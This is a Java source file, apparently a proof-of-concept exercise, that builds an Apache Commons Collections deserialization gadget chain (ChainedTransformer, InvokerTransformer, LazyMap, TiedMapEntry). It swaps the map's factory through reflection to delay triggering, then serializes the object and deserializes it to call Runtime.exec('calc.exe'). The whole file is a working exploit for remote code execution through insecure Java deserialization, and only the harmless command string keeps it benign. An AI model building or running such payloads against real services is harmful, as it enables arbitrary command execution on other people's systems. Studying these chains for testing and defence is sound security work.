import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.ixpqxi.util.SerTools;

import java.io.IOException;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class SolvedProblemPut {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
        };
        ChainedTransformer ct = new ChainedTransformer(transformers);
        Map<Object, Object> hashMap = new HashMap<>();
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap, new ConstantTransformer("test"));

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "key1");
        HashMap<Object, Object> entryHashMap = new HashMap<>();
        entryHashMap.put(tiedMapEntry, "value");
        hashMap.remove("key1");

        Field factory = LazyMap.class.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazyMap, ct);

        SerTools.serialize(entryHashMap);
        SerTools.unserialize("ser.bin");
    }
}
